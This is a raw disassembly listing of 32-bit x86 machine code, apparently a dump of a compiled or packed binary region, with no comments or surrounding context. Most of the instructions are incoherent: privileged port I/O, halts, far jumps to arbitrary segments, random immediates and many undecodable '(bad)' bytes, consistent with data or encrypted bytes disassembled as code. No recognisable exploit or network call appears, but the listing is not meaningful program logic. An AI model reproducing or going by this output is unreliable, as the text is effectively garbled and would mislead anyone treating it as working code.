  4180e3:	push   cs
  4180e4:	add    DWORD PTR [eax],0x29
  4180e7:	jmp    0x5309d799
  4180ec:	mov    dh,0xed
  4180ee:	mov    ds:0xdb1ca6ad,eax
  4180f3:	sti    
  4180f4:	sub    bl,BYTE PTR [edi]
  4180f6:	out    0xcc,al
  4180f8:	pop    es
  4180f9:	cdq    
  4180fa:	xor    esi,esi
  4180fc:	or     esi,DWORD PTR ds:0x7b1cd391
  418102:	ss dec eax
  418104:	and    eax,0x90f8e719
  418109:	je     0x4180bb
  41810b:	test   BYTE PTR [esi+0x68827025],ah
  418111:	mov    bl,BYTE PTR [ebx]
  418113:	ins    BYTE PTR es:[edi],dx
  418114:	jl     0x418165
  418116:	lahf   
  418117:	push   ebp
  418118:	inc    esp
  418119:	hlt    
  41811a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41811b:	sbb    DWORD PTR [ecx-0x679f0dc9],ebp
  418121:	cmp    ch,BYTE PTR [ecx]
  418123:	dec    ebx
  418124:	jb     0x418137
  418126:	cld    
  418127:	fstp   DWORD PTR [ecx]
  418129:	jmp    0x4180c0
  41812b:	pop    edi
  41812c:	push   esp
  41812d:	sahf   
  41812e:	nop
  41812f:	into   
  418130:	fdivr  QWORD PTR [edx]
  418132:	(bad)  
  418133:	jb     0x4180d3
  418135:	aam    0xc6
  418137:	add    eax,0x9b731358
  41813c:	imul   edx,DWORD PTR [ebp+0x4],0xf1fdda6d
  418143:	push   ds
  418144:	mov    cl,BYTE PTR [edi]
  418146:	fsub   DWORD PTR [ebx-0x3dac8acd]
  41814c:	or     DWORD PTR [ebx-0x1b],ecx
  41814f:	lahf   
  418150:	cmp    DWORD PTR [eax+0x62],eax
  418153:	scas   al,BYTE PTR es:[edi]
  418154:	dec    edi
  418155:	push   ds
  418156:	je     0x4181ce
  418158:	js     0x418136
  41815a:	(bad)  
  41815b:	push   ecx
  41815c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41815d:	cdq    
  41815e:	test   bh,ch
  418160:	sar    DWORD PTR [edi-0x7a7a2674],cl
  418166:	sahf   
  418167:	sbb    BYTE PTR [esi+0x6f],cl
  41816a:	or     ch,BYTE PTR [edx+ebx*1]
  41816d:	jle    0x418180
  41816f:	push   esp
  418170:	add    BYTE PTR [ebp+0x59],dh
  418173:	cmp    eax,DWORD PTR [eax+0x5]
  418176:	in     al,dx
  418177:	stos   BYTE PTR es:[edi],al
  418178:	sti    
  418179:	cmp    ah,BYTE PTR [ebx]
  41817b:	or     edi,DWORD PTR [eax+edi*1+0x2f7fdeb0]
  418182:	jmp    0x8511b1c9
  418187:	jecxz  0x4181be
  418189:	push   esp
  41818a:	mov    esp,DWORD PTR [ecx-0x5ca1bdcc]
  418190:	mov    edx,0x9824d6b9
  418195:	fsubr  st(3),st
  418197:	hlt    
  418198:	inc    edx
  418199:	lock mov ?,esp
  41819c:	pop    ebx
  41819d:	xor    edi,DWORD PTR [ebp-0x7d]
  4181a0:	pop    ebx
  4181a1:	fldenv [eax-0x4986857e]
  4181a7:	pop    edx
  4181a8:	imul   ebp,DWORD PTR [esi+0x51],0x20c83b15
  4181af:	sbb    cl,BYTE PTR [esi+eax*8+0x6c7a751d]
  4181b6:	sub    eax,0xed50d6c7
  4181bb:	fmul   DWORD PTR [ecx+0x7a]
  4181be:	leave  
  4181bf:	mov    ah,0x68
  4181c1:	inc    ebp
  4181c2:	shr    DWORD PTR [esi],1
  4181c4:	mov    edx,0x7fbf5bbe
  4181c9:	or     bl,al
  4181cb:	aam    0x5e
  4181cd:	jmp    0x5a87:0x1d8db015
  4181d4:	sbb    bh,BYTE PTR [eax+0x66]
  4181d7:	cmp    ecx,edx
  4181d9:	jns    0x418197
  4181db:	push   0xfffffffd
  4181dd:	cld    
  4181de:	dec    ebx
  4181df:	push   ebp
  4181e0:	push   ebp
  4181e1:	leave  
  4181e2:	pop    esi
  4181e3:	cld    
  4181e4:	test   BYTE PTR [ecx-0x75],dl
  4181e7:	pop    eax
  4181e8:	adc    edx,esi
  4181ea:	jmp    0xa1da:0x4523a65e
  4181f1:	xor    al,0x77
  4181f3:	dec    ebx
  4181f4:	call   DWORD PTR [ecx]
  4181f6:	sti    
  4181f7:	ficomp DWORD PTR [edi]
  4181f9:	jecxz  0x41821d
  4181fb:	loop   0x4181e0
  4181fd:	jmp    0x4181e8
  4181ff:	inc    ebx
  418200:	xchg   edi,eax
  418201:	in     al,dx
  418202:	xchg   edi,eax
  418203:	icebp  
  418204:	jmp    0x418280
  418206:	in     al,dx
  418207:	push   ebp
  418208:	ftst   
  41820a:	xor    al,0x77
  41820c:	jnp    0x4181cf
  41820e:	mov    edx,DWORD PTR [ebx+edi*1-0x6]
  418212:	xchg   ebx,eax
  418213:	int    0x12
  418215:	shr    BYTE PTR [eax],cl
  418217:	jp     0x418277
  418219:	jmp    0x85842a59
  41821e:	sbb    edi,DWORD PTR [eax-0x6a8cf5de]
  418224:	retf   0x86
  418227:	dec    esp
  418228:	fisubr DWORD PTR [esi-0x7b9fa8b8]
  41822e:	dec    ecx
  41822f:	(bad)
  418232:	cmp    edi,DWORD PTR [edx-0x6f93b6b]
  418238:	pusha  
  418239:	adc    esp,DWORD PTR [eax-0x1c]
  41823c:	cdq    
  41823d:	pusha  
  41823e:	xor    al,0xc7
  418240:	pop    ebp
  418241:	or     ebp,DWORD PTR [ebx]
  418243:	dec    esi
  418244:	cld    
  418245:	adc    ebx,DWORD PTR [ebp-0xa]
  418248:	and    BYTE PTR [eax+0x66],al
  41824b:	nop
  41824c:	clc    
  41824d:	mov    BYTE PTR [ecx+0x3f],bh
  418250:	loope  0x418286
  418252:	repz ret 
  418254:	adc    edi,ecx
  418256:	loope  0x4181ff
  418258:	mov    eax,edx
  41825a:	mov    al,ds:0x772b4dfe
  41825f:	mov    edx,0x389a0b40
  418264:	test   edi,edx
  418266:	cmp    bh,0x7b
  418269:	scas   eax,DWORD PTR es:[edi]
  41826a:	mov    esp,0x4c193fb4
  41826f:	pusha  
  418270:	icebp  
  418271:	inc    edx
  418272:	in     eax,0x34
  418274:	cld    
  418275:	add    eax,0xaaf91db7
  41827a:	xor    ah,al
  41827c:	ds pop ss
  41827e:	gs or  al,0xca
  418281:	xlat   BYTE PTR ds:[ebx]
  418282:	add    eax,0x5e4742fc
  418287:	dec    edi
  418288:	int    0x30
  41828a:	cmp    edi,DWORD PTR [ecx+edi*1+0x9]
  41828e:	aad    0xbe
  418290:	inc    esp
  418291:	or     al,BYTE PTR [ebp-0x2c973a4d]
  418297:	sub    dh,BYTE PTR [ebx-0x3d5cbb53]
  41829d:	arpl   cx,bx
  41829f:	pop    ebp
  4182a0:	int    0x97
  4182a2:	jns    0x418249
  4182a4:	(bad)  
  4182a5:	xchg   ebp,eax
  4182a6:	jg     0x418316
  4182a8:	cmp    esp,DWORD PTR [ebp+0x65]
  4182ab:	mov    cs,WORD PTR [eax-0x28]
  4182ae:	mov    ebp,0x347af7cc
  4182b3:	stos   DWORD PTR es:[edi],eax
  4182b4:	sub    esi,ebx
  4182b6:	ins    BYTE PTR es:[edi],dx
  4182b7:	mov    esp,0x29a10f6
  4182bc:	aaa    
  4182bd:	nop
  4182be:	adc    ax,0x9ef3
  4182c2:	cmp    BYTE PTR [edi*2+0x76c1ee09],0xb3
  4182ca:	jmp    0x3aa9:0x96fdc551
  4182d1:	push   0x62
  4182d3:	ror    BYTE PTR [eax+0x61778e61],0xb0
  4182da:	cmp    al,BYTE PTR [ecx]
  4182dc:	(bad)  
  4182dd:	out    dx,eax
  4182de:	push   edi
  4182df:	(bad)  
  4182e0:	inc    esi
  4182e1:	add    cl,dl
  4182e3:	or     ebx,DWORD PTR [eax-0x2e7a42cb]
  4182e9:	mov    bl,0x50
  4182eb:	sub    eax,DWORD PTR [edi-0x36]
  4182ee:	shl    DWORD PTR [edx+edx*8+0x1f428f18],0x6e
  4182f6:	addr16 out 0xa2,eax
  4182f9:	cmc    
  4182fa:	mov    DWORD PTR [esp+eax*2],edx
  4182fd:	clc    
  4182fe:	outs   dx,DWORD PTR ds:[esi]
  4182ff:	cmp    al,ch
  418301:	(bad)
  418306:	out    dx,al
  418307:	mov    edx,0xd0578bd
  41830c:	cdq    
  41830d:	sbb    eax,0x695def58
  418312:	sub    al,0x50
  418314:	rcr    ah,0xf5
  418317:	adc    BYTE PTR [edi-0x15],0x25
  41831b:	scas   al,BYTE PTR es:[edi]
  41831c:	cmp    DWORD PTR [esi+0x676caf94],0x49b6256a
  418326:	mov    ds:0xbf03e6a2,al
  41832b:	fimul  DWORD PTR [edx+ebp*2-0x61]
  41832f:	test   al,0x3a
  418331:	clc    
  418332:	push   esi
  418333:	adc    al,0xe9
  418335:	push   esi
  418336:	out    0xc0,al
  418338:	adc    DWORD PTR [ebx-0x5e],0x26adad1a
  41833f:	xchg   DWORD PTR [edi],edi
  418341:	pop    edx
  418342:	cmp    bl,BYTE PTR [edx+0x44f09c37]
  418348:	scas   eax,DWORD PTR es:[edi]
  418349:	adc    eax,0xddfa15ac
  41834e:	fidiv  DWORD PTR [edx]
  418350:	or     eax,0x84156b3f
  418355:	cmc    
  418356:	push   ss
  418357:	push   ds
  418358:	mov    ch,0x75
  41835a:	xor    ah,BYTE PTR [eax]
  41835c:	loop   0x41834e
  41835e:	jmp    0x4183ae
  418360:	push   DWORD PTR [ecx+ebp*2-0xead7131]
  418367:	cli    
  418368:	xchg   al,ch
  41836a:	shl    DWORD PTR [edi],cl
  41836c:	fidivr DWORD PTR [ecx+edi*1-0x7e2d08dc]
  418373:	sub    eax,0xe284a5c6
  418378:	xchg   ebx,eax
  418379:	mov    cl,BYTE PTR [esi]
  41837b:	or     al,0x1b
  41837d:	daa    
  41837e:	cmc    
  41837f:	dec    esp
  418380:	and    DWORD PTR [eax-0x703ce401],ebx
  418386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418387:	push   0x28
  418389:	mov    ebp,0x33c03e66
  41838e:	mov    al,0xe8
  418390:	iret   
  418391:	pop    edx
  418392:	pusha  
  418393:	sub    cl,BYTE PTR [ebx+0x1d]
  418396:	rcr    BYTE PTR [edi],cl
  418398:	mov    al,0x3d
  41839a:	jl     0x418395
  41839c:	ficom  DWORD PTR [edi]
  41839e:	push   es
  41839f:	test   eax,0xe323f2e8
  4183a4:	retf   0x3eb7
  4183a7:	sahf   
  4183a8:	mov    ecx,0x4f0357a0
  4183ad:	mov    cl,0x1a
  4183af:	int    0xfa
  4183b1:	add    ch,dl
  4183b3:	fs (bad) 
  4183b5:	in     al,0x97
  4183b7:	retf   
  4183b8:	fadd   st(2),st
  4183ba:	ret    0x841
  4183bd:	int    0x4d
  4183bf:	sti    
  4183c0:	xchg   ebx,eax
  4183c1:	xchg   ecx,eax
  4183c2:	jecxz  0x4183b9
  4183c4:	inc    ecx
  4183c5:	xor    ah,dh
  4183c7:	jl     0x4183a1
  4183c9:	fimul  WORD PTR [edi-0x1d31e42d]
  4183cf:	test   al,0x5b
  4183d1:	mov    esi,0x7d9c39dd
  4183d6:	add    esp,DWORD PTR [ecx-0x760d9994]
  4183dc:	sub    al,0x73
  4183de:	ret    0x2cc
  4183e1:	push   cs
  4183e2:	cli    
  4183e3:	dec    ebp
  4183e4:	pop    ds
  4183e5:	stos   BYTE PTR es:[edi],al
  4183e6:	das    
  4183e7:	add    esi,DWORD PTR [ebx-0x4cb22b17]
  4183ed:	mov    eax,ds:0xe7a38f09
  4183f2:	sbb    DWORD PTR [ecx-0x4767b804],edi
  4183f8:	mov    al,0xc5
  4183fa:	xchg   BYTE PTR [eax+0x64],dh
  4183fd:	and    DWORD PTR [ebx+0x5aac18a1],esp
  418403:	mov    al,ds:0xa3577681
  418408:	sub    al,0x9b
  41840a:	mov    ebp,0x201b7405
  41840f:	xor    al,0x26
  418411:	adc    ebp,esi
  418413:	int    0xe4
  418415:	(bad)  
  418416:	fild   WORD PTR [edx-0xd]
  418419:	cmc    
  41841a:	sbb    al,0x26
  41841c:	mov    ch,0xb9
  41841e:	outs   dx,BYTE PTR ds:[esi]
  41841f:	cmc    
  418420:	cmp    al,0x5f
  418422:	pusha  
  418423:	sub    eax,0x766ad78
  418428:	daa    
  418429:	push   0xffffffa2
  41842b:	test   al,0x1e
  41842d:	cmp    eax,0xcf2991ef
  418432:	sub    bl,BYTE PTR [ebx-0x1e7fbc3f]
  418438:	ins    DWORD PTR es:[edi],dx
  418439:	jae    0x418441
  41843b:	sbb    esi,ebx
  41843d:	mov    dh,0x2b
  41843f:	in     al,dx
  418440:	dec    esi
  418441:	inc    ecx
  418443:	test   al,0xa6
  418445:	fcmovnbe st,st(6)
  418447:	push   esp
  418448:	test   al,0x62
  41844a:	adc    eax,ebx
  41844c:	test   al,0x1a
  41844e:	xchg   esi,eax
  41844f:	loop   0x41840a
  418451:	aas    
  418452:	dec    edx
  418453:	and    DWORD PTR [eax],edx
  418455:	push   ebp
  418456:	push   0x28
  418458:	stos   BYTE PTR es:[edi],al
  418459:	and    al,0x69
  41845b:	or     eax,edx
  41845d:	into   
  41845e:	jecxz  0x418467
  418460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418461:	fnsave [edi*8+0x3ca2572a]
  418468:	cli    
  418469:	pop    ebp
  41846a:	inc    ecx
  41846b:	mov    al,ds:0xfa0c6f49
  418470:	sti    
  418471:	sar    BYTE PTR [esi],0x98
  418474:	mov    esi,0x86e7dfb2
  418479:	mov    al,0x6f
  41847b:	mov    bl,bh
  41847d:	out    0x29,al
  41847f:	mov    ch,0xc9
  418481:	out    dx,al
  418482:	mov    eax,0x3fc1164
  418487:	pop    ecx
  418488:	lea    ecx,[edx-0x7486b326]
  41848e:	js     0x41847d
  418490:	mov    eax,0x345e41b7
  418495:	jl     0x418474
  418497:	sub    ch,BYTE PTR [ebx]
  418499:	and    BYTE PTR [edx-0x3],dh
  41849c:	nop
  41849d:	cmp    eax,0x590369fb
  4184a2:	mov    ss,WORD PTR [edi]
  4184a4:	test   BYTE PTR [eax],bh
  4184a6:	xor    BYTE PTR [esi+ecx*1-0x17],ch
  4184aa:	dec    BYTE PTR [edx-0x52]
  4184ad:	gs jb  0x4184b1
  4184b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b1:	retw   0x12e3
  4184b5:	loop   0x4184e6
  4184b7:	ficomp DWORD PTR [ecx]
  4184b9:	dec    eax
  4184ba:	adc    eax,0x597a629c
  4184bf:	fwait
  4184c0:	adc    edx,eax
  4184c2:	push   eax
  4184c3:	cli    
  4184c4:	add    BYTE PTR [esi],dl
  4184c6:	das    
  4184c7:	cld    
  4184c8:	mov    ah,0xd2
  4184ca:	(bad)  [ebx-0x68]
  4184cd:	sbb    eax,0x21e31b64
  4184d2:	push   esi
  4184d3:	rcr    DWORD PTR ds:0xd95374a4,cl
  4184d9:	dec    ecx
  4184da:	jne    0x4184d6
  4184dc:	sub    bl,BYTE PTR [edi+0x3d]
  4184df:	fst    st(2)
  4184e1:	pop    ds
  4184e2:	pushf  
  4184e3:	add    eax,0xa6da7731
  4184e8:	test   al,0x89
  4184ea:	ds ret 0xf4a6
  4184ee:	and    bl,BYTE PTR [edi+edx*4-0xb4d5589]
  4184f5:	mov    ebx,0xe19e7b8b
  4184fa:	int    0xb5
  4184fc:	add    BYTE PTR [edi-0x10],ah
  4184ff:	mov    eax,ds:0x3987b660
  418504:	push   cs
  418505:	pop    esi
  418506:	mov    ?,WORD PTR [esi-0x25]
  418509:	dec    ebx
  41850a:	mov    eax,ds:0x544165c4
  41850f:	xchg   DWORD PTR [ecx+0x70f57f07],esp
  418515:	ret    0x9f5
  418518:	dec    edi
  418519:	stos   BYTE PTR es:[edi],al
  41851a:	adc    eax,0x492dc7c
  41851f:	neg    ecx
  418521:	gs sub ch,bh
  418524:	(bad)  
  418525:	xchg   ebx,eax
  418526:	bound  edi,QWORD PTR [edx+0x25]
  418529:	jecxz  0x418531
  41852b:	outs   dx,BYTE PTR ds:[esi]
  41852c:	jb     0x418565
  41852e:	cmp    eax,DWORD PTR [eax-0x6e]
  418531:	dec    esp
  418532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418533:	xchg   ebp,eax
  418534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418535:	push   edx
  418536:	push   0x2
  418538:	je     0x418554
  41853a:	jge    0x418563
  41853c:	rol    DWORD PTR [edx-0x61d15d88],0x76
  418543:	sub    BYTE PTR [esi-0x5cde6f96],cl
  418549:	mov    ds:0x8130815c,eax
  41854e:	(bad)  
  41854f:	loop   0x4184e7
  418551:	out    0xe1,eax
  418553:	push   edi
  418554:	in     al,dx
  418555:	add    eax,0x802eda77
  41855a:	or     eax,0xf495d23b
  41855f:	jnp    0x4184f1
  418561:	inc    esi
  418562:	jno    0x418544
  418564:	dec    ebx
  418565:	mov    esp,0xcf2419d7
  41856a:	jne    0x418580
  41856c:	cmc    
  41856d:	jnp    0x418538
  41856f:	ins    BYTE PTR es:[edi],dx
  418570:	cdq    
  418571:	outs   dx,DWORD PTR ds:[esi]
  418572:	or     al,0xb8
  418574:	or     DWORD PTR [ecx+0x6b21c84],ebx
  41857a:	inc    edi
  41857b:	or     eax,0x2619eb87
  418580:	mov    bh,0x9
  418582:	push   ebx
  418583:	addr16 push esi
  418585:	icebp  
  418586:	iret   
  418587:	lods   eax,DWORD PTR ds:[esi]
  418588:	mov    ecx,0xc7c35260
  41858d:	mov    cl,0x23
  41858f:	jecxz  0x41856f
  418591:	jbe    0x418580
  418593:	mov    ds:0x384f8b59,al
  418598:	shl    DWORD PTR [ecx-0x199d11e4],cl
  41859e:	push   esp
  41859f:	ret    
  4185a0:	jp     0x4185e2
  4185a2:	mov    bl,0xad
  4185a4:	add    BYTE PTR [esi-0x36],ch
  4185a7:	jns    0x418565
  4185a9:	in     al,0x7a
  4185ab:	dec    edi
  4185ac:	test   BYTE PTR [edx],dl
  4185ae:	dec    ebx
  4185af:	pop    ecx
  4185b0:	cmp    dh,BYTE PTR [esi+0x44]
  4185b3:	push   cs
  4185b4:	jne    0x4185ba
  4185b6:	test   BYTE PTR [esi+0x6d7e158a],0xfd
  4185bd:	push   cs
  4185be:	aad    0xb7
  4185c0:	push   ss
  4185c1:	retf   
  4185c2:	mov    ebp,0xce9398c9
  4185c7:	std    
  4185c8:	cs sub al,0x85
  4185cb:	jmp    0xdd159876
  4185d0:	loop   0x418608
  4185d2:	aad    0x1a
  4185d4:	(bad)  
  4185d5:	xor    BYTE PTR [ecx-0x18ea4554],dh
  4185db:	icebp  
  4185dc:	enter  0xca82,0x5e
  4185e0:	mov    ?,WORD PTR [esi-0x7e]
  4185e3:	jl     0x418598
  4185e5:	test   BYTE PTR [esi+0x3475146b],0x44
  4185ec:	jge    0x4185aa
  4185ee:	cmp    eax,0xcab2e62a
  4185f3:	test   eax,0x670700e0
  4185f8:	ds cmp al,0x34
  4185fb:	shl    DWORD PTR [eax],1
  4185fd:	or     BYTE PTR [esi-0x15],bl
  418600:	sbb    al,0x9b
  418602:	into   
  418603:	in     al,dx
  418604:	sub    eax,0xbfe694b
  418609:	repnz dec esp
  41860b:	rcl    DWORD PTR [eax],cl
  41860d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41860f:	sar    BYTE PTR [ebx],1
  418611:	bound  ebx,QWORD PTR [ecx+0x32cc6a8]
  418617:	and    ebp,ebp
  418619:	xchg   ebp,eax
  41861a:	pushf  
  41861b:	icebp  
  41861c:	clc    
  41861d:	mov    eax,0x8c1462f6
  418622:	cmp    edi,0x3c
  418625:	or     eax,0x8335698e
  41862a:	loope  0x418695
  41862c:	mov    esi,0x1cd423b0
  418631:	data16 cmp BYTE PTR ds:0x13857f8d,ah
  418638:	mov    dh,BYTE PTR [edi+0x41]
  41863b:	loope  0x4185be
  41863d:	mov    eax,ds:0xdb47da83
  418642:	mov    ch,0xd8
  418644:	or     edx,DWORD PTR [edx+0x6d7f693]
  41864a:	neg    DWORD PTR [ecx-0x38]
  41864d:	adc    al,0xe7
  41864f:	dec    ecx
  418650:	mov    bl,0x1b
  418652:	xchg   ecx,eax
  418653:	sub    al,0x83
  418655:	sar    BYTE PTR [eax],0xf7
  418658:	popa   
  418659:	aad    0xea
  41865b:	push   ss
  41865c:	cmp    eax,0x69b58b69
  418661:	test   al,0x2
  418663:	cmp    DWORD PTR [esi],0xae252e90
  418669:	shl    cl,0x7
  41866c:	mov    ds:0x3df25818,eax
  418671:	jo     0x4186a2
  418673:	dec    ecx
  418674:	rcr    bl,1
  418676:	adc    al,0x2f
  418678:	mov    ebp,0xf44273a8
  41867d:	inc    esp
  41867e:	push   eax
  41867f:	jmp    0x5742:0xab079fee
  418686:	jbe    0x41869d
  418688:	jmp    0x5c69:0x8dab4c6b
  41868f:	jns    0x4186c9
  418691:	pop    ecx
  418692:	(bad)  
  418693:	push   edi
  418694:	repnz fnsave [eax+edi*8]
  418698:	jno    0x418702
  41869a:	icebp  
  41869b:	inc    esi
  41869c:	sbb    dh,BYTE PTR [ebx-0x4e]
  41869f:	pushf  
  4186a0:	pop    edi
  4186a1:	jno    0x41864f
  4186a3:	loop   0x418668
  4186a5:	dec    DWORD PTR [eax-0x1f]
  4186a8:	add    eax,0xfd022b3b
  4186ad:	cmc    
  4186ae:	cmp    bl,ch
  4186b0:	fwait
  4186b1:	lock stc 
  4186b3:	int3   
  4186b4:	inc    eax
  4186b5:	xchg   DWORD PTR [eax],eax
  4186b7:	dec    edx
  4186b8:	into   
  4186b9:	ds jnp 0x418725
  4186bc:	loop   0x4186b6
  4186be:	add    bl,BYTE PTR [ecx+0xfd849d5]
  4186c4:	icebp  
  4186c5:	dec    eax
  4186c6:	lahf   
  4186c7:	mov    ebp,0xcb1ebb5e
  4186cc:	jno    0x4186ef
  4186ce:	adc    DWORD PTR [ecx-0x29421433],edi
  4186d4:	fwait
  4186d5:	mov    dh,0x7b
  4186d7:	loopne 0x4186f7
  4186d9:	mov    dh,0x63
  4186db:	jmp    0x4186fe
  4186dd:	push   ss
  4186de:	sbb    ebp,esp
  4186e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186e1:	lahf   
  4186e2:	(bad)  
  4186e3:	push   edx
  4186e4:	xor    bh,BYTE PTR [ecx]
  4186e6:	sub    edi,DWORD PTR [edi+eax*1]
  4186e9:	inc    ebp
  4186ea:	add    BYTE PTR [edi-0x64],dh
  4186ed:	sbb    ch,BYTE PTR [ecx+0x50]
  4186f0:	mov    edx,DWORD PTR [edx+ecx*2-0x45]
  4186f4:	cmp    al,0x41
  4186f6:	(bad)  
  4186f7:	inc    eax
  4186f8:	imul   eax,DWORD PTR [esi-0x38e08087],0x3d
  4186ff:	inc    eax
  418700:	(bad)  
  418701:	mov    ebx,0x15102850
  418706:	pop    ebx
  418707:	jo     0x4186cf
  418709:	mov    dl,0x68
  41870b:	ret    
  41870c:	cmp    ch,dh
  41870e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41870f:	jmp    0x7cf6e668
  418714:	rol    ebx,0xb0
  418717:	js     0x418776
  418719:	or     al,0xf1
  41871b:	pop    esp
  41871c:	pop    ebx
  41871d:	rol    BYTE PTR [edx+ebp*1+0x3e],cl
  418721:	mov    dh,BYTE PTR [ecx+0x65]
  418724:	inc    ecx
  418725:	push   eax
  418726:	into   
  418727:	mov    bl,al
  418729:	or     ebx,DWORD PTR [ecx-0x5ee85921]
  41872f:	test   eax,0x89a4edcd
  418734:	ffree  st(0)
  418736:	aam    0x1e
  418738:	icebp  
  418739:	fcom   DWORD PTR [ebx+0x69b3bf63]
  41873f:	rcr    eax,0xce
  418742:	jb     0x4186e2
  418744:	test   DWORD PTR [esi-0x54f2e109],ebx
  41874a:	loope  0x4186e7
  41874c:	test   DWORD PTR [eax-0x718b8fe5],esi
  418752:	pop    edx
  418753:	lods   eax,DWORD PTR ds:[esi]
  418754:	sbb    DWORD PTR [ebx],0x3e1ce577
  41875a:	je     0x418784
  41875c:	(bad)  
  41875e:	imul   ecx,DWORD PTR [ebx+0x2],0x3
  418762:	je     0x418769
  418764:	and    DWORD PTR [esi-0x4a],ebp
  418767:	xor    al,0x27
  418769:	cmp    esi,DWORD PTR [eax-0x4a065788]
  41876f:	jae    0x418744
  418771:	mov    eax,ds:0xad4ab0f3
  418776:	mov    dh,0x2a
  418778:	xor    esi,DWORD PTR [edx-0x57]
  41877b:	push   ss
  41877c:	les    edx,FWORD PTR [edi]
  41877e:	pop    ebx
  41877f:	mov    edx,0x3b0b7836
  418784:	cld    
  418785:	push   cs
  418786:	mov    edi,0xe1b5979
  41878b:	cld    
  41878c:	jecxz  0x418786
  41878e:	dec    esi
  41878f:	xchg   ebp,eax
  418790:	pop    ds
  418791:	and    bl,BYTE PTR [edi]
  418793:	sub    eax,DWORD PTR ds:[ebx-0x45]
  418797:	fwait
  418798:	add    eax,0xb9647c63
  41879d:	dec    ecx
  41879e:	mov    eax,0xb93dbab0
  4187a3:	call   0xad23:0xa41523c4
  4187aa:	scas   eax,DWORD PTR es:[edi]
  4187ab:	lock push ebx
  4187ad:	fnsave [edi]
  4187af:	add    ecx,DWORD PTR [edi+0x60]
  4187b2:	sahf   
  4187b3:	aas    
  4187b4:	cmp    eax,0xa4dc4415
  4187b9:	ja     0x418751
  4187bb:	js     0x4187b0
  4187bd:	les    edx,FWORD PTR [ebx+edi*1-0x54]
  4187c1:	jbe    0x41875b
  4187c3:	adc    BYTE PTR ds:0x94f75c27,0x30
  4187ca:	clc    
  4187cb:	fisttp WORD PTR [edx+ebx*1+0x6]
  4187cf:	push   cs
  4187d0:	loope  0x418807
  4187d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187d3:	push   0x7b
  4187d5:	test   al,0x69
  4187d7:	ss in  al,dx
  4187d9:	push   0x42
  4187db:	js     0x418836
  4187dd:	fwait
  4187de:	push   ds
  4187df:	imul   ecx,eax,0xffffffab
  4187e2:	cmp    al,0x28
  4187e4:	dec    esi
  4187e5:	fwait
  4187e6:	dec    ecx
  4187e7:	fs pop ecx
  4187e9:	(bad)
  4187ec:	jns    0x418845
  4187ee:	mov    dl,0xb4
  4187f0:	sub    eax,0x91b69f83
  4187f5:	add    al,0x5b
  4187f7:	jo     0x41883f
  4187f9:	xchg   ebp,eax
  4187fa:	mov    fs,eax
  4187fc:	mov    eax,0xe3d803
  418801:	lds    esi,FWORD PTR [ecx+0x555ae93a]
  418807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418808:	sub    DWORD PTR [ecx-0x79],ecx
  41880b:	push   0xfffffffd
  41880d:	adc    bl,ch
  41880f:	lock addr16 mov ecx,0xb5aca0d2
  418816:	fwait
  418817:	sbb    bh,bh
  418819:	jge    0x4187a1
  41881b:	repnz dec ebp
  41881d:	sub    al,BYTE PTR [esi]
  41881f:	sub    DWORD PTR [ebx],0xffffffcd
  418822:	push   cs
  418823:	push   edi
  418824:	ror    ebp,cl
  418826:	scas   al,BYTE PTR es:[edi]
  418827:	and    cl,BYTE PTR [ebx-0x3a34c588]
  41882d:	pop    esp
  41882e:	sub    BYTE PTR [ecx+0xd],ch
  418831:	mov    ebx,0x816ef598
  418836:	test   BYTE PTR ss:[edi+ebp*1],bh
  41883a:	fsub   st(3),st
  41883c:	test   al,0x7c
  41883e:	jo     0x4187fe
  418840:	rcr    cl,1
  418842:	pushf  
  418843:	retf   0xd582
  418846:	jmp    0x6f3a2b39
  41884b:	shl    BYTE PTR [eax+ebx*4],1
  41884e:	push   0x78d3a72b
  418853:	idiv   BYTE PTR [esi+0x50055521]
  418859:	popf   
  41885a:	dec    esi
  41885b:	sbb    al,0x6
  41885d:	out    0xc6,eax
  41885f:	mov    ah,0xde
  418861:	(bad)  
  418863:	pop    es
  418864:	and    al,0x6f
  418866:	out    0xe0,al
  418868:	iret   
  418869:	ficomp DWORD PTR [ecx+0x87e61cd]
  41886f:	imul   esp,DWORD PTR ds:0xb4a97654,0x228228d2
  418879:	call   0x3b18:0x68b9d55b
  418880:	fdiv   QWORD PTR [edx+ebx*4]
  418883:	mov    bl,0x64
  418885:	jp     0x4188b6
  418887:	inc    esp
  418888:	pop    ebx
  418889:	std    
  41888a:	mov    edx,0xfea3aa58
  41888f:	pop    ecx
  418890:	and    eax,0xda87bf56
  418895:	and    al,0x5a
  418897:	mov    edx,0xc5befc71
  41889c:	outs   dx,BYTE PTR ds:[esi]
  41889d:	and    eax,0x31dc2f7
  4188a2:	push   ebx
  4188a3:	rol    DWORD PTR [eax-0x1da0dfe8],cl
  4188a9:	loop   0x418854
  4188ab:	jae    0x41886c
  4188ad:	outs   dx,BYTE PTR ds:[esi]
  4188ae:	cmc    
  4188af:	lea    esp,[eax]
  4188b1:	loopne 0x4188cb
  4188b3:	call   0xed90:0x56c1640a
  4188ba:	add    DWORD PTR [ebp+0x7b26a7fd],ecx
  4188c0:	cld    
  4188c1:	xchg   esp,eax
  4188c2:	or     ecx,DWORD PTR [edx+edi*8]
  4188c5:	int    0x66
  4188c7:	mov    WORD PTR [esi],cs
  4188c9:	out    dx,al
  4188ca:	pop    edx
  4188cb:	or     eax,0x61c0e72a
  4188d0:	jg     0x418933
  4188d2:	or     ebp,DWORD PTR [edi+ebp*2+0x1b001c7b]
  4188d9:	mov    ebx,0xdb1228b9
  4188de:	mov    ds:0xfd529244,eax
  4188e3:	adc    ecx,ebx
  4188e5:	cld    
  4188e6:	int    0x3a
  4188e8:	dec    edx
  4188e9:	loope  0x418891
  4188eb:	sub    dl,0xa0
  4188ee:	push   esp
  4188ef:	xchg   esi,eax
  4188f0:	pop    esi
  4188f1:	push   ecx
  4188f2:	in     al,dx
